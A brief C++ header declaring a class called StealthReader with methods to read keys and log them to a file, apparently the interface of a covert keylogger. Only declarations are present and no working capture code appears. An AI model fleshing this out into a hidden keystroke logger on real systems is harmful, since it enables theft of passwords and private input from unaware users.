#pragma once

#include <string>
#include "fstream"

class StealthReader
{
public:
	StealthReader();
	void readKeys(void);

	void logToFileOnce();
	void logToFile();

private:
	std::fstream logFile;
	char key = 'x';
};

